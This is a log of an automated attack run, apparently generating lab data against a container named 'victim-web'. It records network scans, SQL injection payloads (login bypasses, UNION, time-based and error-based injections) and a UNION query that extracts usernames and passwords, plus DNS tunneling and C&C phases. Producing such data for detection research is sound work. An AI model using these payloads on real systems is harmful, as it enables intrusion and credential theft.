2025-07-23 19:31:33,287 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-23 19:31:33,288 - INFO - Container ID: attacker
2025-07-23 19:31:33,288 - INFO - Target: http://victim-web:80
2025-07-23 19:31:33,288 - INFO - Attack Type: sql_injection
2025-07-23 19:31:33,288 - INFO - Variant ID: None
2025-07-23 19:31:33,288 - INFO - Benign Only: False
2025-07-23 19:31:33,288 - INFO - ============================================================
2025-07-23 19:31:33,288 - INFO - === Testing Container Connectivity ===
2025-07-23 19:31:33,291 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-23 19:31:33,292 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-23 19:31:33,292 - INFO - === Network Reconnaissance Phase ===
2025-07-23 19:31:33,292 - INFO - Running: nmap -sS -p- victim-web
2025-07-23 19:31:33,998 - INFO - [+] Nmap scan completed with return code: 0
2025-07-23 19:31:38,999 - INFO - === Web Application Enumeration Phase ===
2025-07-23 19:31:39,000 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-23 19:31:40,043 - INFO - [+] Dirb scan completed with return code: 0
2025-07-23 19:31:40,044 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-23 19:31:47,397 - INFO - [+] Nikto scan completed with return code: 0
2025-07-23 19:31:52,402 - INFO - === Custom SQL Injection Phase ===
2025-07-23 19:31:52,403 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-23 19:31:52,417 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 19:31:54,517 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-23 19:31:54,521 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 19:31:56,029 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-23 19:31:56,039 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 19:31:58,105 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-23 19:31:58,120 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-23 19:32:00,428 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-23 19:32:00,436 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-23 19:32:01,665 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-23 19:32:01,676 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-23 19:32:03,858 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-23 19:32:03,864 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:32:06,592 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-23 19:32:06,613 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:32:08,913 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-23 19:32:08,924 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:32:10,813 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-23 19:32:10,823 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:32:11,929 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-23 19:32:11,932 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-23 19:32:19,307 - INFO - === Data Extraction Phase ===
2025-07-23 19:32:19,318 - INFO -     Found 1 columns in search query
2025-07-23 19:32:19,319 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-23 19:32:19,326 - INFO -     Status: 200, Success: True
2025-07-23 19:32:19,349 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-23 19:32:19,353 - INFO -     Found user: admin
2025-07-23 19:32:20,355 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-23 19:32:20,362 - INFO -     Found user: alice
2025-07-23 19:32:21,365 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-23 19:32:21,375 - INFO -     Found user: bob
2025-07-23 19:32:22,377 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-23 19:32:22,392 - INFO -     Found user: guest
2025-07-23 19:32:23,395 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-23 19:32:23,407 - INFO -     Found user: john
2025-07-23 19:32:24,409 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-23 19:32:24,419 - INFO -     Found user: manager
2025-07-23 19:32:25,425 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-23 19:32:25,431 - INFO -     Found user: test
2025-07-23 19:32:26,433 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-23 19:32:26,442 - INFO -     Found user: user1
2025-07-23 19:32:27,444 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-23 19:32:27,456 - INFO -     Found user: user1
2025-07-23 19:32:28,458 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-23 19:32:28,471 - INFO -     Found user: test
2025-07-23 19:32:29,474 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-23 19:32:29,476 - INFO - === DNS Attack Phase ===
2025-07-23 19:32:29,477 - INFO - Generating DNS proxy logs...
2025-07-23 19:32:29,479 - INFO - Generated 5 DNS proxy log entries
2025-07-23 19:32:29,479 - INFO - Generating HTTP proxy logs...
2025-07-23 19:32:29,480 - INFO - Generated 5 HTTP proxy log entries
2025-07-23 19:32:29,480 - INFO - DNS Attack Configuration: {'enabled': True, 'phases': ['reconnaissance', 'brute_force', 'cache_poisoning', 'amplification', 'tunneling', 'cc_communication'], 'intensity': 'high', 'delay_between_queries': '0.5-1', 'subdomain_wordlist_size': 80}
2025-07-23 19:32:29,481 - ERROR - DNS attack phase failed: __init__() missing 1 required positional argument: 'target_domain'
2025-07-23 19:32:29,481 - INFO - === Saving Attack Results ===
2025-07-23 19:32:29,482 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-23 19:32:29,490 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-23 19:32:29,491 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-23 19:32:29,492 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-23 19:32:29,492 - INFO - 
[ATTACK_END] 2025-07-23T19:32:29.481584
2025-07-23 19:32:29,492 - INFO - 
✅ Enhanced container attack completed!
2025-07-23 19:32:29,492 - INFO - Check the following for attack data:
2025-07-23 19:32:29,492 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-23 19:32:29,492 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-23 19:32:29,494 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-23 19:32:29,494 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-23 19:32:29,494 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-23 19:32:29,494 - INFO - - Extracted data: /opt/output/extracted_data.html
2025-07-24 00:33:05,713 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-24 00:33:05,713 - INFO - Container ID: attacker
2025-07-24 00:33:05,714 - INFO - Target: http://victim-web:80
2025-07-24 00:33:05,714 - INFO - Attack Type: sql_injection
2025-07-24 00:33:05,714 - INFO - Variant ID: None
2025-07-24 00:33:05,714 - INFO - Benign Only: False
2025-07-24 00:33:05,715 - INFO - ============================================================
2025-07-24 00:33:05,715 - INFO - === Testing Container Connectivity ===
2025-07-24 00:33:05,719 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-24 00:33:05,719 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-24 00:33:05,719 - INFO - === Network Reconnaissance Phase ===
2025-07-24 00:33:05,719 - INFO - Running: nmap -sS -p- victim-web
2025-07-24 00:33:06,427 - INFO - [+] Nmap scan completed with return code: 0
2025-07-24 00:33:11,433 - INFO - === Web Application Enumeration Phase ===
2025-07-24 00:33:11,434 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-24 00:33:12,499 - INFO - [+] Dirb scan completed with return code: 0
2025-07-24 00:33:12,500 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-24 00:33:19,745 - INFO - [+] Nikto scan completed with return code: 0
2025-07-24 00:33:24,753 - INFO - === Custom SQL Injection Phase ===
2025-07-24 00:33:24,761 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-24 00:33:24,776 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 00:33:27,043 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-24 00:33:27,053 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 00:33:29,292 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-24 00:33:29,300 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 00:33:32,032 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-24 00:33:32,046 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-24 00:33:33,233 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-24 00:33:33,265 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 00:33:35,037 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-24 00:33:35,064 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-24 00:33:37,536 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-24 00:33:37,548 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:33:38,890 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-24 00:33:38,901 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:33:40,221 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-24 00:33:40,231 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:33:42,480 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-24 00:33:42,490 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:33:43,960 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-24 00:33:43,969 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 00:33:50,385 - INFO - === Data Extraction Phase ===
2025-07-24 00:33:50,400 - INFO -     Found 1 columns in search query
2025-07-24 00:33:50,400 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-24 00:33:50,407 - INFO -     Status: 200, Success: True
2025-07-24 00:33:50,429 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-24 00:33:50,433 - INFO -     Found user: admin
2025-07-24 00:33:51,435 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-24 00:33:51,443 - INFO -     Found user: alice
2025-07-24 00:33:52,448 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-24 00:33:52,460 - INFO -     Found user: bob
2025-07-24 00:33:53,464 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-24 00:33:53,472 - INFO -     Found user: guest
2025-07-24 00:33:54,478 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-24 00:33:54,489 - INFO -     Found user: john
2025-07-24 00:33:55,491 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-24 00:33:55,508 - INFO -     Found user: manager
2025-07-24 00:33:56,510 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-24 00:33:56,525 - INFO -     Found user: test
2025-07-24 00:33:57,526 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-24 00:33:57,539 - INFO -     Found user: user1
2025-07-24 00:33:58,541 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-24 00:33:58,551 - INFO -     Found user: user1
2025-07-24 00:33:59,554 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-24 00:33:59,568 - INFO -     Found user: test
2025-07-24 00:34:00,572 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-24 00:34:00,573 - INFO - === DNS Attack Phase ===
2025-07-24 00:34:00,574 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 00:34:37,477 - INFO - Generated 22 DNS attack log entries
2025-07-24 00:34:37,479 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 00:34:37,479 - INFO - Generating HTTP proxy logs...
2025-07-24 00:34:37,483 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 00:34:37,483 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'cache_poisoning', 'amplification', 'tunneling', 'cc_communication'], 'intensity': 'high', 'delay_between_queries': '0.5-1', 'subdomain_wordlist_size': 80}
2025-07-24 00:34:37,484 - INFO - Executing DNS reconnaissance...
2025-07-24 00:34:39,547 - INFO - Executing DNS brute force...
2025-07-24 00:34:40,613 - INFO - Executing DNS tunneling...
2025-07-24 00:34:41,357 - INFO - Executing C&C communication...
2025-07-24 00:34:41,979 - INFO - DNS attack phase completed successfully
2025-07-24 00:34:41,981 - INFO - === Saving Attack Results ===
2025-07-24 00:34:41,985 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-24 00:34:41,988 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-24 00:34:41,990 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-24 00:34:41,991 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-24 00:34:41,991 - INFO - 
[ATTACK_END] 2025-07-24T00:34:41.980902
2025-07-24 00:34:41,992 - INFO - 
✅ Enhanced container attack completed!
2025-07-24 00:34:41,992 - INFO - Check the following for attack data:
2025-07-24 00:34:41,992 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-24 00:34:41,992 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-24 00:34:41,993 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-24 00:34:41,994 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-24 00:34:41,994 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-24 00:34:41,994 - INFO - - Extracted data: /opt/output/extracted_data.html
2025-07-24 02:04:27,295 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-24 02:04:27,296 - INFO - Container ID: attacker
2025-07-24 02:04:27,296 - INFO - Target: http://victim-web:80
2025-07-24 02:04:27,296 - INFO - Attack Type: sql_injection
2025-07-24 02:04:27,296 - INFO - Variant ID: None
2025-07-24 02:04:27,296 - INFO - Benign Only: False
2025-07-24 02:04:27,296 - INFO - ============================================================
2025-07-24 02:04:27,297 - INFO - === Testing Container Connectivity ===
2025-07-24 02:04:27,300 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-24 02:04:27,300 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-24 02:04:27,300 - INFO - === Network Reconnaissance Phase ===
2025-07-24 02:04:27,301 - INFO - Running: nmap -sS -p- victim-web
2025-07-24 02:04:28,035 - INFO - [+] Nmap scan completed with return code: 0
2025-07-24 02:04:33,047 - INFO - === Web Application Enumeration Phase ===
2025-07-24 02:04:33,088 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-24 02:04:34,121 - INFO - [+] Dirb scan completed with return code: 0
2025-07-24 02:04:34,121 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-24 02:04:41,411 - INFO - [+] Nikto scan completed with return code: 0
2025-07-24 02:04:46,418 - INFO - === Custom SQL Injection Phase ===
2025-07-24 02:04:46,420 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-24 02:04:46,456 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 02:04:48,504 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-24 02:04:48,522 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 02:04:50,639 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-24 02:04:50,652 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 02:04:51,749 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-24 02:04:51,756 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-24 02:04:53,045 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-24 02:04:53,057 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-24 02:04:54,812 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-24 02:04:54,823 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-24 02:04:55,957 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-24 02:04:55,966 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:04:58,781 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-24 02:04:58,786 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:05:00,182 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-24 02:05:00,194 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:05:02,502 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-24 02:05:02,512 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:05:05,218 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-24 02:05:05,222 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-24 02:05:12,803 - INFO - === Data Extraction Phase ===
2025-07-24 02:05:12,813 - INFO -     Found 1 columns in search query
2025-07-24 02:05:12,813 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-24 02:05:12,821 - INFO -     Status: 200, Success: True
2025-07-24 02:05:12,852 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-24 02:05:12,854 - INFO -     Found user: admin
2025-07-24 02:05:13,856 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-24 02:05:13,871 - INFO -     Found user: alice
2025-07-24 02:05:14,878 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-24 02:05:14,890 - INFO -     Found user: bob
2025-07-24 02:05:15,900 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-24 02:05:15,909 - INFO -     Found user: guest
2025-07-24 02:05:16,912 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-24 02:05:16,927 - INFO -     Found user: john
2025-07-24 02:05:17,934 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-24 02:05:17,940 - INFO -     Found user: manager
2025-07-24 02:05:18,944 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-24 02:05:18,963 - INFO -     Found user: test
2025-07-24 02:05:19,967 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-24 02:05:19,973 - INFO -     Found user: user1
2025-07-24 02:05:20,976 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-24 02:05:20,987 - INFO -     Found user: user1
2025-07-24 02:05:21,990 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-24 02:05:22,010 - INFO -     Found user: test
2025-07-24 02:05:23,013 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-24 02:05:23,014 - INFO - === DNS Attack Phase ===
2025-07-24 02:05:23,015 - INFO - Generating DNS proxy logs with attack traffic...
2025-07-24 02:06:53,029 - INFO - Generated 55 DNS attack log entries
2025-07-24 02:06:53,037 - INFO - DNS attack logs appended to /opt/output/proxy/dns_proxy_raw.jsonl
2025-07-24 02:06:53,038 - INFO - Generating HTTP proxy logs...
2025-07-24 02:06:53,049 - INFO - Generated 5 HTTP proxy log entries
2025-07-24 02:06:53,050 - INFO - DNS Attack Configuration: {'enabled': True, 'target_domain': 'victim-web.local', 'phases': ['reconnaissance', 'brute_force', 'cache_poisoning', 'amplification', 'tunneling', 'cc_communication'], 'intensity': 'high', 'delay_between_queries': '0.5-1', 'subdomain_wordlist_size': 80}
2025-07-24 02:06:53,052 - INFO - Executing DNS reconnaissance...
2025-07-24 02:06:55,211 - INFO - Executing DNS brute force...
2025-07-24 02:06:57,050 - INFO - Executing DNS tunneling...
2025-07-24 02:06:57,700 - INFO - Executing C&C communication...
2025-07-24 02:06:58,499 - INFO - DNS attack phase completed successfully
2025-07-24 02:06:58,499 - INFO - === Saving Attack Results ===
2025-07-24 02:06:58,500 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-24 02:06:58,501 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-24 02:06:58,502 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-24 02:06:58,503 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-24 02:06:58,503 - INFO - 
[ATTACK_END] 2025-07-24T02:06:58.499506
2025-07-24 02:06:58,503 - INFO - 
✅ Enhanced container attack completed!
2025-07-24 02:06:58,503 - INFO - Check the following for attack data:
2025-07-24 02:06:58,504 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-24 02:06:58,504 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-24 02:06:58,504 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-24 02:06:58,504 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-24 02:06:58,504 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-24 02:06:58,504 - INFO - - Extracted data: /opt/output/extracted_data.html
